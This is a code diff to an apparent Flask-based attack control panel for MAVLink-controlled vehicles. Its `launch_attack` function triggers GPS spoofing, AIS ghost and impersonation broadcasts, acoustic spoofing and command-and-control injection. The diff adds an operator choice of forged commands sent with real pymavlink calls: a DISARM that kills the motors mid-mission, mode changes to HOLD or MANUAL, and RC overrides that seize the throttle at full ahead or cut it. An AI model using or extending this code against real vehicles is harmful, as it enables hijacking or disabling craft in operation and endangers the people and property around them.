@@ -205,7 +205,8 @@ def _relay(cmd):
         print(f"relay write failed: {e}")
 
 
-def launch_attack(kind):
+def launch_attack(kind, opts=None):
+    opts = opts or {}
     if kind == "gps_spoof":
         _relay("step"); return "GPS spoof engaged (+50 m offset injected)"
     if kind == "ais_spoof":
@@ -218,16 +219,36 @@ def launch_attack(kind):
                          kwargs={"interval_s": 2.0, "offset_m": 300.0}, daemon=True).start()
         return "AIS spoof engaged (ghost + impersonation broadcasting)"
     if kind == "c2_replay":
+        # operator chooses WHICH forged command to inject
+        command = opts.get("command", "rc_override")
         import c2_replay
+        labels = {
+            "rc_override": "forged RC override — attacker seizing the throttle (full ahead)",
+            "rc_stop":     "forged RC override — attacker cutting the throttle (stop)",
+            "disarm":      "forged DISARM — attacker killing the motors mid-mission",
+            "mode_hold":   "forged mode change -> HOLD — attacker halting the mission",
+            "mode_manual": "forged mode change -> MANUAL — attacker dropping autonomy",
+        }
+
         def _c2():
             c = cmd_conn()
-            c.set_mode(c.mode_mapping().get("MANUAL", 0)); time.sleep(1.5)
-            for _ in range(5):
+            if command == "disarm":
                 c.mav.command_long_send(c.target_system, c.target_component,
-                    mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM, 0, 1, 0, 0, 0, 0, 0, 0); time.sleep(1)
-            c2_replay.inject_forged_rc_override(c, throttle_pwm=1900, steering_pwm=1500, duration_s=8.0)
+                    mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM, 0, 0, 0, 0, 0, 0, 0, 0)
+                c2_replay.log_attack_event(time.time(), "inject_disarm", "forged disarm")
+            elif command == "mode_hold":
+                c2_replay.inject_forged_mode_change(c, "HOLD")
+            elif command == "mode_manual":
+                c2_replay.inject_forged_mode_change(c, "MANUAL")
+            else:  # rc_override variants -- seize the actuators directly
+                c.set_mode(c.mode_mapping().get("MANUAL", 0)); time.sleep(1.5)
+                for _ in range(5):
+                    c.mav.command_long_send(c.target_system, c.target_component,
+                        mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM, 0, 1, 0, 0, 0, 0, 0, 0); time.sleep(1)
+                thr = 1300 if command == "rc_stop" else 1900
+                c2_replay.inject_forged_rc_override(c, throttle_pwm=thr, steering_pwm=1500, duration_s=8.0)
         threading.Thread(target=_c2, daemon=True).start()
-        return "C2 injection: forged RC override (attacker seizing the throttle)"
+        return "C2 injection: " + labels.get(command, command)
     if kind == "acoustic_spoof":
         import acoustic_spoof as A
         c = cmd_conn()
@@ -344,7 +365,7 @@ def index():
 def cmd_attack():
     kind = request.json.get('type')
     try:
-        return jsonify(ok=True, msg=launch_attack(kind))
+        return jsonify(ok=True, msg=launch_attack(kind, request.json))
     except Exception as e:
         return jsonify(ok=False, msg=str(e)), 500
 
